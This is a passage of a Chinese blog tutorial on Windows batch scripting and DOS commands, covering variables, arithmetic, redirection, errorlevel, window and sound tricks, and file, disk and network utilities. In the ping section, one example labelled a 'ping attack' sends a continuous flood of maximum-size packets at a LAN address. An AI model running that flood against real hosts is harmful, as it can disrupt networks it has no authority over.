src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/ProgrammingLanguages/Batch/批处理笔记/串扩充-display-1.png" alt="串扩充-display-1"></center><p><strong>eg2</strong>：</p><pre class=" language-bat"><code class="language-bat">@echo offset aa=C:\Windows\PPP\a.btxcall :deal aaa %aa% "c c" ddd eeepause>nulexit:dealecho %%0 = %0echo %%1 = %1echo %%2 = %2echo %%3 = %3echo %%4 = %4echo %%5 = %5</code></pre><ul><li>其中，变量aa在之前是不可以扩充的，通过call命令并将aa作为参数传递给子函数:deal，将aa变量转换成了变量%1，即符合%x格式，从而可以进行字符串扩充。</li><li>至于%x中x取a-z A-Z的形式，可以复习一下for语句，for语句里面的变量就是用%x来表示的，因而可以直接进行扩充。</li></ul><p><strong>结果展示</strong>：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/ProgrammingLanguages/Batch/批处理笔记/串扩充-display-2.png" alt="串扩充-display-2"></center><h2 id="数值计算"><a href="#数值计算" class="headerlink" title="数值计算"></a>数值计算</h2><p>​        批处理里面的数值计算功能较弱，只能进行整型计算，忽略浮点数的小数部分；同时数值计算的范围也受限于系统位数，对于目前较为常见的32位机来说，数值计算能处理的数值范围为0x80000000h-0x7FFFFFFFh，即-2147483648-+2147483647。</p><p><strong>语法</strong>：</p><pre class=" language-bat"><code class="language-bat">set /a expression</code></pre><ul><li>expressio：代表计算的表达式，可以跟多个需要用逗号(“,”)隔开</li></ul><p><strong>数值运算符</strong></p><table><thead><tr><th align="center">运算符</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">()</td><td align="center">分组</td></tr><tr><td align="center">! ~ -</td><td align="center">一元运算符(逻辑非、按位非、取负)</td></tr><tr><td align="center">* / %</td><td align="center">算数运算符(乘、取商、取余)</td></tr><tr><td align="center">+ -</td><td align="center">算数运算符(加、减)</td></tr><tr><td align="center">&lt;&lt; &gt;&gt;</td><td align="center">逻辑移位(左移一位、右移一位)</td></tr><tr><td align="center">&amp;</td><td align="center">按位与</td></tr><tr><td align="center">^</td><td align="center">按位非</td></tr><tr><td align="center">|</td><td align="center">按位或</td></tr><tr><td align="center">= *= /= %= += -= &amp;= ^= |= &lt;&lt;= &gt;&gt;=</td><td align="center">赋值</td></tr><tr><td align="center">,</td><td align="center">表达式分隔符</td></tr></tbody></table><p><strong>eg</strong>：</p><p><a href="#varCalculate">详细实例</a></p><h2 id="特殊符号"><a href="#特殊符号" class="headerlink" title="特殊符号"></a>特殊符号</h2><table><thead><tr><th align="center">特殊符号</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">@</td><td align="center"><font color="red">不回显当前行</font>中的命令</td></tr><tr><td align="center"><code>&gt; filename</code></td><td align="center">重定向输出，覆盖</td></tr><tr><td align="center"><code>&gt;&gt; filename</code></td><td align="center">重定向输出但<font color="red">不覆盖</font>(在末尾追加)</td></tr><tr><td align="center"><code>&lt;</code></td><td align="center">重定向输入</td></tr><tr><td align="center">|</td><td align="center"><font color="red">管道</font>传输命令</td></tr><tr><td align="center">^</td><td align="center"><font color="red">转义字符</font></td></tr><tr><td align="center">&amp;</td><td align="center">允许在一行中使用两个以上不同命令(<font color="red">命令之间独立</font>)</td></tr><tr><td align="center">&amp;&amp;</td><td align="center">允许在一行中使用两个以上不同命令<br>(<font color="red">前面命令执行的结果将影响到后边的命令是否执行</font>)</td></tr><tr><td align="center">“”</td><td align="center">双引号允许在字符串中<font color="red">可包含空格</font></td></tr><tr><td align="center">,</td><td align="center">某些情况下可以<font color="red">当作空格来用</font></td></tr><tr><td align="center">;</td><td align="center">命令相同时，<font color="red">参数</font>之间可以使用分号隔开</td></tr><tr><td align="center">::</td><td align="center">注释该行(直接跳过该行)</td></tr></tbody></table><p><span name="ComoareOp"><strong>比较运算符</strong></span></p><table><thead><tr><th align="center">比较运算符</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">==</td><td align="center">等于</td></tr><tr><td align="center">EQU</td><td align="center">等于</td></tr><tr><td align="center">NEQ</td><td align="center">不等于</td></tr><tr><td align="center">LSS</td><td align="center">小于</td></tr><tr><td align="center">LEQ</td><td align="center">小于或等于</td></tr><tr><td align="center">GTR</td><td align="center">大于</td></tr><tr><td align="center">GEQ</td><td align="center">大于或等于</td></tr></tbody></table><h2 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h2><p>​        有些命令在执行之后将会返回一定的错误值(errorlevel)，可以通过errorlevel的值<a href="#iferrorlevel">判断命令</a>执行的情况。</p><p><strong>eg</strong>：</p><pre class=" language-bat"><code class="language-bat">@echo offreg add HKCU /v try /f>nulreg delete HKCU /v try /fif errorlevel 0 (echo 删除成功！ ) else (echo 删除失败！)reg delete HKCU /v try /fif %errorlevel%==0 (echo 删除成功！ ) else (echo 删除失败！)pause>nul</code></pre><ul><li>一般情况下，程序或命令成功执行时，返回的errorlevel是0，错误时返回1或更高的值。</li><li>逻辑判断也是根据命令的返回值(errorlevel)进行判断的</li></ul><p><strong>结果展示</strong>：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/ProgrammingLanguages/Batch/批处理笔记/返回值-display.png" alt="返回值-display"></center><h2 id="视窗设置"><a href="#视窗设置" class="headerlink" title="视窗设置"></a>视窗设置</h2><p>​        DOS中提供对视窗进行设置的一些命令，如：title、color、mode、msg等</p><ul><li>title：设置窗体显示的标题</li><li>color：设置窗口背景颜色和字体颜色(xx)</li><li>mode：设置窗体大小。<strong>cols设置宽度，lines设置高度</strong>。</li><li>msg：GUI交互窗口</li></ul><p><strong>语法</strong>：</p><pre class=" language-bat"><code class="language-bat">:: 设置颜色color [xx]:: 设置宽度和高度mode con [cols=c] [lines=n]:: 信息交互msg username /w /time:seconds message</code></pre><ul><li>[xx]：x为一个十六进制数值，第一个x应用于背景，第二个x应用于前景<ul><li>0 = 黑色      </li><li>1 = 蓝色      </li><li>2 = 绿色      </li><li>3 = 浅绿色     </li><li>4 = 红色       </li><li>5 = 紫色       </li><li>6 = 黄色       </li><li>7 = 白色       </li><li>8 = 灰色</li><li>9 = 淡蓝色</li><li>A = 淡绿色</li><li>B = 淡浅绿色</li><li>C = 淡红色</li><li>D = 淡紫色</li><li>E = 淡黄色</li><li>F = 亮白色</li></ul></li><li>clos：设置宽度</li><li>lines：设置高度</li><li>username：设置用户名</li><li>/w：等待用户响应</li><li>/time:seconds：等待接收器确认消息的时间延迟</li><li>message：要发送的信息</li></ul><p><strong>eg</strong>：</p><pre class=" language-bat"><code class="language-bat">@echo offset a=10set b=0:texset /a a+=3set /a b+=1:: 设置窗体大小mode con cols=%a% lines=%b%if %a% lss 60 goto :texecho O(∩_∩)O 圣诞快乐 O(∩_∩)Oset a=15,a6,2e,d0,34,8b,4f,9d,5e:: 改变窗口颜色for %%i in (%a%) do (:: ping自己ping -n 2 127.1>nulcolor %%i)::for %%i in (%a%,%a%) do (::ping -n 1 127.1>nul::color %%i::):: 重定向>>ms.txt echo          */.    .   .    *      .>>ms.txt echo          .\*    .    []           * __>>ms.txt echo          */ .   ./\~~~~~~~~~~~~'\. ^|◆>>ms.txt echo           \*   ,/,..,\,...........,\.◆>>ms.txt echo           ^|^| ..▎# ▎田 田 ▎ ^| ▎◆>>ms.txt echo           ^|^| ^&^&▎   ▎       ▎'^|'▎ o>>ms.txt echo           ^|^| ##■■■■■■■■■■〓:: msgmsg %username% /w /time:3600 <ms.txtdel ms.txtpause</code></pre><p><strong>结果展示</strong>：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/ProgrammingLanguages/Batch/批处理笔记/视窗设置-display.png" alt="视窗设置-display"></center><h2 id="声音设置"><a href="#声音设置" class="headerlink" title="声音设置"></a>声音设置</h2><p>​        批处理中还能以语音的形式展示信息。</p><p><strong>eg</strong>：</p><pre class=" language-bat"><code class="language-bat">@echo offecho 做好准备，响了啊！！pausecls:: 强大，支持英文、中文，不支持日语mshta vbscript:createobject("sapi.spvoice").speak("Merry Christmas and Happy New Year! 新年快乐!すみません!")(window.close)pauseclsecho.echo 怎么样？呵呵，刺激吧~pause</code></pre><h2 id="ASCII"><a href="#ASCII" class="headerlink" title="ASCII"></a>ASCII</h2><p><strong>eg</strong>：</p><pre class=" language-bat"><code class="language-bat">@echo off&mode con cols=80:beginclsset/p file=请输入要处理的文件(Q 键直接退出此脚本):        if /i "%file%"=="Q" goto :eof        if "%file%"=="" goto errorset new=%random%for %%a in (%file%) do set size=%%~za        if "%size%"=="0" goto errorcls&fsutil file createnew %new% %size% >nulecho=&&echo=文件内容所对应的ASCII码的十六进制形式依次为:&echo==========================================================for /f "skip=1 tokens=3" %%a in ('fc /B %new% %file%') do (        set /p=%%a <nul)echo=&echo==========================================================&echo=&echo=&echo=文件内容所对应的ASCII码的十进制形式依次为:&echo==========================================================setlocal EnableDelayedExpansionfor /f "skip=1 tokens=3" %%a in ('fc /B %new% %file%') do (        set num=%%a        set /a num=0x!num!        set /p=!num! <nul)del %new%endlocal&echo;&echo==========================================================&echo;&pauseexit /b 0:error        cls&echo;&echo;        echo         “输入错误” OR “文件大小为零”，请重新输入……        del %new% >nul 2>nul        set file=        set new=        pause>nul&goto :beginl</code></pre><p><strong>结果展示</strong>：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/ProgrammingLanguages/Batch/批处理笔记/ASCII-display.png" alt="ASCII-display"></center><h2 id="常用DOS命令"><a href="#常用DOS命令" class="headerlink" title="常用DOS命令"></a>常用DOS命令</h2><h3 id="文件夹管理"><a href="#文件夹管理" class="headerlink" title="文件夹管理"></a>文件夹管理</h3><h4 id="cd"><a href="#cd" class="headerlink" title="cd"></a>cd</h4><p>​    (<font color="blue">change directory</font>)跳转到指定目录下</p><p><strong>语法</strong>：</p><pre class=" language-bat"><code class="language-bat">cd [绝对路径]::跳转到指定的绝对路径下cd ..::跳转到当前目录的父目录cd \::跳转到根目录</code></pre><h4 id="md"><a href="#md" class="headerlink" title="md"></a>md</h4><p>​    (<font color="blue">make directory</font>)创建目录</p><p><strong>语法</strong>：</p><pre class=" language-bat"><code class="language-bat">md [绝对路径] | [相对路径]::在指定位置创建文件夹md [文件夹名称]:: 在当前路径下创建文件夹</code></pre><p><strong>注</strong>：</p><ul><li>路径中的文件夹不存在时会自动创建该文件夹</li></ul><h4 id="rd"><a href="#rd" class="headerlink" title="rd"></a>rd</h4><p>​    (<font color="blue">remove directory</font>)删除目录</p><p><strong>语法</strong>：</p><pre class=" language-bat"><code class="language-bat">rd [相对路径] | [绝对路径] | [文件夹名称]</code></pre><p><strong>注</strong>：</p><ul><li>删除的目录不能有子文件夹</li><li>要删除的目录下不能有文件</li><li>不能删除当前目录</li><li>根目录不能被删除</li><li><font color="red">创建容易删除很难</font></li></ul><h4 id="dir"><a href="#dir" class="headerlink" title="dir"></a>dir</h4><p>​    (<font color="blue">directory</font>)展示当前目录下的文件和文件夹</p><p><strong>语法</strong>：</p><pre class=" language-bat"><code class="language-bat">::展示目录下的文件和文件夹dir [目录] [/p] [/w] [/ad] [/a] [/s]</code></pre><p><strong>说明</strong>：</p><ul><li>/p：分屏显示文件夹内容</li><li>/w：宽屏显示文件夹内容（文件夹以[<em>dirName</em>]形式显示，文件以文件名显示）</li><li>/ad：只显示文件夹而不显示文件</li><li>/a：显示隐藏文件</li><li>/s：显示指定目录和所有子目录中的文件</li></ul><h4 id="tree"><a href="#tree" class="headerlink" title="tree"></a>tree</h4><p>​    展示指定启动器的目录子树</p><p><strong>语法</strong>：</p><pre class=" language-bat"><code class="language-bat">tree [盘符] [/f] [/a]</code></pre><p><strong>说明</strong>：</p><ul><li>盘符：显示所有的目录子树</li><li>/f：显示目录同时显示文件名（默认只显示目录）</li><li>/a：以ASCII码显示目录树</li></ul><h4 id="path"><a href="#path" class="headerlink" title="path"></a>path</h4><h4 id="xcopy"><a href="#xcopy" class="headerlink" title="xcopy"></a>xcopy</h4><p>​        复制文件或目录到指定目录下</p><p><strong>语法</strong>：</p><pre class=" language-bat"><code class="language-bat">:: 拷贝文件xcopy [源目录] [目的目录]:: 拷贝目录xcopy [源文件名] [目的目录]:: 拷贝文件和目录xcopy *.* [目的目录] {/s | /e} /v</code></pre><ul><li>/s：拷贝非空子目录</li><li>/e：拷贝所有目录</li><li>/v：拷贝后检验，会影响速度</li></ul><h3 id="文件管理"><a href="#文件管理" class="headerlink" title="文件管理"></a>文件管理</h3><h4 id="copy"><a href="#copy" class="headerlink" title="copy"></a>copy</h4><p>​        复制源文件到到指定位置</p><p><strong>语法</strong>：</p><pre class=" language-bat"><code class="language-bat">copy [源文件] [目的文件]copy con 目标文件名</code></pre><p><strong>注</strong>：</p><ul><li>源文件与目标文件不能相同</li><li>目标文件省略时，复制到当前文件夹下</li><li>不能复制只读属性的文件</li><li>结合通配符可复制多个文件</li></ul><h4 id="type"><a href="#type" class="headerlink" title="type"></a>type</h4><p>​        在命令行中显示<strong>文本文件</strong>的内容</p><p><strong>语法</strong>：</p><pre class=" language-bat"><code class="language-bat">type [文本文件名称]</code></pre><h4 id="del"><a href="#del" class="headerlink" title="del"></a>del</h4><p>​        删除一个或数个文件</p><p><strong>语法</strong>：</p><pre class=" language-bat"><code class="language-bat">del {[文件名] | [*.后缀名]} [/p] [/q] [/f] [/s]</code></pre><ul><li>/p：删除每个文件之前提示确认信息</li><li>/q：<font color="red">安静模式</font>，删除全局通配符时，不要求确认</li><li>/f：强制删除只读文件</li><li>/s：从所有子目录删除指定文件</li></ul><h4 id="move"><a href="#move" class="headerlink" title="move"></a>move</h4><p>​        移动文件或更改目录名</p><p><strong>语法</strong>：</p><pre class=" language-bat"><code class="language-bat">:: 将文件移动到新的目录下move [文件名] [目的目录]:: 更改目录的名称move [目录名] [目录名] </code></pre><h4 id="ren"><a href="#ren" class="headerlink" title="ren"></a>ren</h4><p>​        重命名文件</p><p><strong>语法</strong>：</p><pre class=" language-bat"><code class="language-bat">ren [源文件名] [新的文件名]</code></pre><h4 id="replace"><a href="#replace" class="headerlink" title="replace"></a>replace</h4><p>​        替换文件</p><h4 id="find"><a href="#find" class="headerlink" title="find"></a>find</h4><p>​        搜索文件内容</p><p><strong>语法</strong>：</p><pre class=" language-bat"><code class="language-bat">find "string" filename</code></pre><p><strong>说明</strong>：</p><ul><li>string：待查找的字符串</li><li>filename：文件名(或文件路径)</li><li>当找到时，回显字符串所在行的全部内容；否则，回显空行</li></ul><h4 id="fc"><a href="#fc" class="headerlink" title="fc"></a>fc</h4><p>​        比较两个文件或文件集并展示它们之间的不同</p><h4 id="attrib"><a href="#attrib" class="headerlink" title="attrib"></a>attrib</h4><p>​        显示或更改文件属性</p><p><strong>语法</strong>：</p><pre class=" language-bat"><code class="language-bat">ATTRIB [+R | -R] [+A | -A] [+S | -S] [+H | -H] [+O | -O] [+I | -I] [+X | -X] [+P | -P] [+U | -U]       [drive:][path][filename] [/S [/D]] [/L]</code></pre><ul><li>+/-R：设置或清除文件的只读属性</li><li>+/-A：设置或清除文件的存档属性</li><li>+/-S：设置或清除文件的系统属性</li><li>+/-H：设置或清除文件的隐藏属性</li><li>drive:path filename:指示文件的位置</li><li>/s：处理当前文件夹及其所有子文件夹中的匹配文件</li></ul><p><strong>eg</strong>：</p><pre class=" language-bat"><code class="language-bat">:: 将D盘下demo文件夹中的1.txt文件设置为只读attrib +r D:\demo\1.txt /s:: 将D盘下demo文件夹中的1.txt文件的属性设置为“存档”attrib +a D:\demo\1.txt /s:: 将D盘下demo文件夹中的1.txt文件的属性设置为“系统”属性attrib +s D:\demo\1.txt /s:: 将D盘下demo文件夹中的1.txt文件的属性设置为“隐藏”attrib +h D:\demo\1.txt /s:: 清除D盘下demo文件夹中的1.txt文件的“隐藏”属性attrib -h D:\demo\1.txt /s</code></pre><h4 id="openfiles"><a href="#openfiles" class="headerlink" title="openfiles"></a>openfiles</h4><p>​        允许管理员列出系统上已打开的文件和文件夹或与其断开连接。</p><p><strong>语法</strong>：</p><pre class=" language-bat"><code class="language-bat">openfiles /parameter [arguments]</code></pre><ul><li>parameter：<ul><li>disconnect：中断至少一个打开的文件的连接</li><li>query：显示所有从本地或从共享文件夹打开的文件</li><li>local：启用/禁用本地打开文件的显示</li></ul></li></ul><p><strong>eg</strong>：</p><pre class=" language-bat"><code class="language-bat">:: 断开IP地址为192.168.1.12的远程计算机中所有被打开的共享文件openfiles /disconnect /s 192.168.1.12 /id *:: 断开用户名为Guest、IP为192.168.1.12的远程计算机中所有被打开的文件openfiles /disconnect /s 192.168.1.12 /a Guest:: 断开IP为192.168.1.12的远程计算机中所有以“读/写”方式打开的文件openfiles /disconnect /s 192.168.1.12 /o read/write:: 显示IP为192.168.1.12的计算机的已经打开的远程文件openfiles /query /s 192.168.1.12:: 以Table格式显示IP为192.168.1.12的远程计算机中被打开的文件的基本信息openfiles /query /s 192.168.1.12 /fo table /v</code></pre><h4 id="takeown"><a href="#takeown" class="headerlink" title="takeown"></a>takeown</h4><p>​        该工具以重新分配文件所有权的方式允许管理员重新获取先前被拒绝访问的文件访问权。</p><p><strong>语法</strong>：</p><pre class=" language-bat"><code class="language-bat">TAKEOWN [/S system [/U username [/P [password]]]]        /F filename [/A] [/R [/D prompt]]</code></pre><ul><li>/f：指定文件或目录名模式</li><li>/a：将所有权给予管理员组，而不是当前用户</li><li>/r：递归，指示工具运行于指定的目录和子目录的文件上</li></ul><p><strong>eg</strong>：</p><pre class=" language-bat"><code class="language-bat">:: 设置IP为192.168.1.12远程计算机为demo文件夹中的1.txt的访问权限由计算机的管理员所拥有takeown /f \\192.168.1.12\d:\demo\1.txt:: 设置本地管理员组拥有IP为192.168.1.12的远程计算机的demo文件或文件夹的访问权限takeown /f \\192.168.1.12\d:\demo\1.txt /a:: 设置管理员拥有IP为192.168.1.12远程计算机的demo文件夹（包括其子文件）的访问权限:: takeown /f \\192.168.1.12\d:\demo /r</code></pre><h4 id="assoc"><a href="#assoc" class="headerlink" title="assoc"></a>assoc</h4><p>​        显示或修改文件扩展名关联</p><p><strong>语法</strong>：</p><pre class=" language-bat"><code class="language-bat">ASSOC [.ext[=[fileType]]]</code></pre><ul><li>不带参数时，显示当前文件关联</li><li>.ext：指定跟文件类型关联的文件扩展名</li><li>fileType：指定跟文件扩展名关联的文件类型</li></ul><p><strong>eg</strong>：</p><pre class=" language-bat"><code class="language-bat">:: 显示当前文件关联assoc:: 修改扩展名为.wsz的关联类型为wszfileassoc .wsz=wszfile:: 显示文件扩展名为.txt的关联assoc .txt</code></pre><h4 id="bootcfg"><a href="#bootcfg" class="headerlink" title="bootcfg"></a>bootcfg</h4><p>​        用来在 BOOT.INI 文件中配置、查询、更改或删除启动项目设置。</p><p><strong>语法</strong>：</p><pre class=" language-bat"><code class="language-bat">BOOTCFG /parameter [arguments]BOOTCFG /Copy [/S system [/U user [/P [password]]]] [/D description] /ID bootidBOOTCFG /Delete [/S system [/U user [/P [password]]]] /ID bootidBOOTCFG /Query [/S system [/U user [/P [password]]]]BOOTCFG /Raw osoptions [/S system [/U user [/P [password]]]] /ID bootid [/A]BOOTCFG /Timeout value [/S system [/U user [/P [password]]]]BOOTCFG /Default [/S system [/U user [/P [password]]]] /ID bootidBOOTCFG /Addsw [/S system [/U user [/P [password]]]]                   { [/MM val] [/BV] [/SO] [/NG] } /ID bootidBOOTCFG /Rmsw [/S system [/U user [/P [password]]]]                  { [/MM] [/BV] [/SO] [/NG] } /ID bootid</code></pre><ul><li>parameter：<ul><li>copy：生成一个现有启动项目的副本</li><li>delete：从BOOT.INI文件中删除现有的启动项</li><li>query：显示当前启动项目和它们的设置</li><li>/raw：允许用户指定要添加的任务任何开关</li><li>/timeout：允许用户更改超时值</li><li>/default：允许用户更改默认启动项目</li><li>/addsw：允许用户添加预定义开关</li><li>/rmsw：允许用户删除预定义开关</li></ul></li></ul><p><strong>eg</strong>：</p><pre class=" language-bat"><code class="language-bat">:: 生成启动项目为“1”的副本bootcfg /copy /d "Windows With Debug" /ID 1:: 删除启动项目“1”bootcfg /delete /id 1:: 显示所有当前启动项目和设置bootcfg /query:: 在boot.ini文件中的操作系统目录"2"添加开关bootcfg /raw "/debug/sos" /a /id /2:: 将boot.ini文件中的超时值更改为“36”bootcfg /timeout 36:: 将boot.ini文件中的启动项目“2”设置为默认的启动项目bootcfg /default /id 2:: 为boot.ini文件中的启动项目“2”添加开关bootcfg /addsw /so /id 2:: 从boot.ini文件中删除启动项目“2”的开关bootcfg /rmsw /so /id 2</code></pre><h4 id="cacls"><a href="#cacls" class="headerlink" title="cacls"></a>cacls</h4><p>​        显示或者修改文件的访问控制列表(ACL)</p><p><strong>语法</strong>：</p><pre class=" language-bat"><code class="language-bat">CACLS filename [/T] [/M] [/L] [/S[:SDDL]] [/E] [/C] [/G user:perm]        [/R user [...]] [/P user:perm [...]] [/D user [...]]</code></pre><ul><li>/e：编辑 ACL 而不替换。</li></ul><p><strong>eg</strong>：</p><pre class=" language-bat"><code class="language-bat">:: 显示D:\demo\1.txt文件的访问控制列表cacls D:\demo\1.txt:: 编辑D:\demo\1.txt文件的ACLcacls D:\demo\1.txt /e</code></pre><h4 id="compact"><a href="#compact" class="headerlink" title="compact"></a>compact</h4><p>​        显示或改变 NTFS 分区上文件的压缩。</p><p><strong>语法</strong>：</p><pre class=" language-bat"><code class="language-bat">COMPACT [/C | /U] [/S[:dir]] [/A] [/I] [/F] [/Q] [/EXE[:algorithm]]        [/CompactOs[:option] [/WinDir:dir]] [filename [...]]</code></pre><p><strong>eg</strong>：</p><pre class=" language-bat"><code class="language-bat">:: 将D:\demo\1.txt文件压缩compact /c D:\demo\1.txt:: 将D:\demo\1.txt文件解压缩compact /u D:\demo\1.txt</code></pre><h3 id="磁盘管理"><a href="#磁盘管理" class="headerlink" title="磁盘管理"></a>磁盘管理</h3><h4 id="format"><a href="#format" class="headerlink" title="format"></a>format</h4><p>​        格式化磁盘</p><h4 id="label"><a href="#label" class="headerlink" title="label"></a>label</h4><p>​        用于创建、修改或删除磁盘卷标</p><p><strong>语法</strong>：</p><pre class=" language-bat"><code class="language-bat">label [f:备份分区]:: 将F驱动器设置为“备份分区”卷标</code></pre><h4 id="chkdsk"><a href="#chkdsk" class="headerlink" title="chkdsk"></a>chkdsk</h4><p>​        检查磁盘并显示状态报告</p><p><strong>语法</strong>：</p><pre class=" language-bat"><code class="language-bat">chkdsk [盘符] [文件路径] [/f] [/r] [/x] [/c]</code></pre><p><strong>说明</strong>：</p><ul><li>/f：修复磁盘上的错误（必须锁定磁盘）</li><li>/r：找到坏扇区并恢复可读取的信息（必须锁定磁盘）</li><li>/x：仅在NTFS上使用。如果必要，首先强制卸载卷。</li><li>/c：仅随NTFS使用。跳过文件夹结构中的周期检查，减少运行chkdsk所需的时间量</li></ul><p><strong>eg</strong>：</p><pre class=" language-bat"><code class="language-bat">chkdsk D: /f:: 检查驱动器D，并修复错误</code></pre><h4 id="recover"><a href="#recover" class="headerlink" title="recover"></a>recover</h4><p>​        从损坏的磁盘中恢复可读取的信息。</p><p><strong>语法</strong>：</p><pre class=" language-bat"><code class="language-bat">recover [盘符] [文件路径][文件名]</code></pre><p><strong>eg</strong>：</p><pre class=" language-bat"><code class="language-bat">recover D:/readme.txt:: 恢复驱动器D中的文件readme.txt</code></pre><h3 id="网络管理"><a href="#网络管理" class="headerlink" title="网络管理"></a>网络管理</h3><h4 id="ping"><a href="#ping" class="headerlink" title="ping"></a>ping</h4><p>​        进行网络连接测试、名称解析</p><p><strong>语法</strong>：</p><pre class=" language-bat"><code class="language-bat">ping [-t] [-a] [-n count] [-l length] [-f] [-i ttl] [-v tos] [-r count] [-s count] [-j -Host-list] | [-k Host-list] [-w timeout] destination-list </code></pre><ul><li>-t：向目的主机持续发送ICMP包，知道按下【Ctrl+C】才停止</li><li>-a：解析主机的NETBIOS主机名</li><li>-n count：定义用来测试所发出的ICMP包的个数，缺省值为4，其常被用来衡量网速</li><li>-l length：定义所发送缓冲区的数据包的大小，在默认情况下Windows的ping发送的数据包的大小为32Byte，使用该参数可以自己定义数据包的大小，但其最大限制为65500Byte，超出这个数时，接受方可能因为接受的数据包太大了死机，所以Microsoft为解决该安全漏洞限制了ping的数据包大小</li><li>-f：在数据包中设置“不要分段标识”，通常发送的数据包都会由路由分段再发送给接受方，使用该参数后路由不会进行分段操作</li><li>-i ttl：指定TTL值在对方系统里停留的时间</li><li>-v tos：将“服务类型”字段设置为“tos”指定的值</li><li>-r count：在“记录路由”字段中记录传出和返回数据包的路由。一般情况下你发送的数据包是通过一个个路由才到达对方的，但到底是经过了哪些路由呢？通过此参数就可以设定你想探测经过的路由的个数，不过限制在了9个，也就是说你只能跟踪到9个路由。</li><li>-s count：指定“count” 指定的跃点数的时间戳，此参数和-r差不多，只是这个参数不记录数据包返回所经过的路由，最多也只记录4个。</li><li>-j Host-list：利用“ computer-list” 指定的计算机列表路由数据包。连续计算机可以被中间网关分隔IP 允许的最大数量为 9。</li><li>-k Host-list：利用 “computer-list” 指定的计算机列表路由数据包。连续计算机不能被中间网关分隔IP 允许的最大数量为 9。</li><li>-w timeout：指定超时间隔，单位为毫秒。 </li><li>destination-list：是指要测试的主机名或IP地址或网址</li></ul><p><strong>eg</strong>：</p><pre class=" language-bat"><code class="language-bat">:: 连通测试ping 192.168.1.105:: 测试hosts文件ping localhost:: ping攻击(自定义数据的大小)ping -l 65500 -t 192.168.1.1:: 获取局域网计算机名称ping -a 192.168.1.1:: 获取网站的IP地址ping www.baidu.com:: 自定义检测数据包的数量ping -n 20 192.168.1.1</code></pre><h4 id="tracert"><a href="#tracert" class="headerlink" title="tracert"></a>tracert</h4><p>​        追踪ICMP包到达目标的路径</p><p><strong>语法</strong>：</p><pre class=" language-bat"><code class="language-bat">tracert [-d] [-h maximum_hops] [-j host-list] [-w timeout]               [-R] [-S srcaddr] [-4] [-6] target_name</code></pre><ul><li>target_name：追踪的目标（可以时IP地址也可以是网站）</li></ul><p><strong>eg</strong>：</p><pre class=" language-bat"><code class="language-bat">:: 检测到达百度服务器的路由是否存在故障tracert www.baidu.com</code></pre><h4 id="pathping"><a href="#pathping" class="headerlink" title="pathping"></a>pathping</h4><p>​        提供有关在来源和目标之间的中间跃点处的网络滞后和网络丢失的信息。</p><p><strong>语法</strong>：</p><pre class=" language-bat"><code class="language-bat">pathping [-g host-list] [-h maximum_hops] [-i address] [-n]                [-p period] [-q num_queries] [-w timeout]                [-4] [-6] target_name</code></pre><ul><li>-n：不将地址解析成主机名</li></ul><p><strong>eg</strong>：</p><pre class=" language-bat"><code class="language-bat">:: 检测本机计算机到本地网关之间的路径pathping 192.168.1.1:: 检测远程计算机的路径pathping -n www.baidu.com</code></pre><h4 id="ipconfig"><a href="#ipconfig" class="headerlink" title="ipconfig"></a>ipconfig</h4><p>​        显示/修改TCP/IP设置</p><p><strong>语法</strong>:</p><pre class=" language-bat"><code class="language-bat">ipconfig [/all] [/renew [Adapter]] [/release [Adapter]] [/flushdns] [/displaydns] [/registerdns] [/showclassid Adapter] [/setclassid Adapter [ClassID]]</code></pre><ul><li>/all：显示所有适配器的完整 TCP/IP 配置信息。</li><li>/renew [Adapter]：更新所有适配器（如果未指定适配器），或特定适配器（如果包含了 Adapter 参数）的 DHCP 配置信息。</li><li>/release [Adapter]：发送 DHCPRELEASE 消息到 DHCP 服务器，以释放所有适配器（如果未指定适配器）或特定适配器（如果包含了 Adapter 参数）的当前 DHCP 配置并丢弃 IP 地址配置。该参数可以禁用配置为自动获取 IP 地址的适配器的 TCP/IP。</li><li>/registerdns：对 DNS 名称和 IP 地址的手工动态注册进行初始化。</li><li>/displaydns：显示 DNS 客户解析器缓存的内容，包括从本地主机文件预装载的记录以及由计算机解析的名称查询而最近获得的任何资源记录。DNS 客户服务在查询配置的 DNS 服务器之前使用这些信息快速解析被频繁查询的名称。</li><li>/flushdns：清理并重设 DNS 客户解析器缓存的内容。如有必要，在 DNS 疑难解答期间，可以使用本过程从缓存中丢弃否定性缓存记录和任何其他动态添加的记录。</li><li>/showclassid Adapter：显示指定适配器的 DHCP 类别 ID。要查看所有适配器的 DHCP 类别 ID，可以使用星号 (*) 通配符代替 Adapter。该参数仅在具有配置为自动获取 IP 地址的网卡的计算机上可用。</li><li>/setclassid Adapter [ClassID]：配置特定适配器的 DHCP 类别 ID。要设置所有适配器的 DHCP 类别 ID，可以使用星号 (*) 通配符代替 Adapter。该参数仅在具有配置为自动获取 IP 地址的网卡的计算机上可用。如果未指定 DHCP 类别 ID，则会删除当前类别 ID。 </li></ul><p><strong>eg</strong>：</p><pre class=" language-bat"><code class="language-bat">ipconfig /all:: 显示详细的网络协议配置信息ipconfig /renew:: 更新IP地址ipconfig /registerdns:: 初始化网络配置ipconfig /displaydns:: 显示本地DNS信息ipconfig /flushdns:: 清除本地DNS缓存内容ipconfig /release:: 取消IP地址租用ipconfig /all > D:\ipconfigBak.txt:: 备份网络配置</code></pre><h4 id="getmac"><a href="#getmac" class="headerlink" title="getmac"></a>getmac</h4><p>​        显示计算机中网卡的媒体访问控制地址，即MAC地址</p><p><strong>语法</strong>：</p><pre class=" language-bat"><code class="language-bat">getmac [/S system]</code></pre><ul><li>/s <em>system</em>：查看局域网内主机的MAC地址及网络协议</li></ul><p><strong>eg</strong>：</p><pre class=" language-bat"><code class="language-bat">getmac:: 显示本地网卡地址getmac /s 10.85.0.88 -u Administrator -p password:: 查看局域网内计算机网卡地址信息</code></pre><h4 id="netstat"><a href="#netstat" class="headerlink" title="netstat"></a>netstat</h4><p>​        显示活动的TCP连接、计算机侦听的端口、以太网统计信息、IP路由表等。</p><p><strong>语法</strong>：</p><pre class=" language-bat"><code class="language-bat">netstat [-a] [-e] [-n] [-o] [-p proto] [-r] 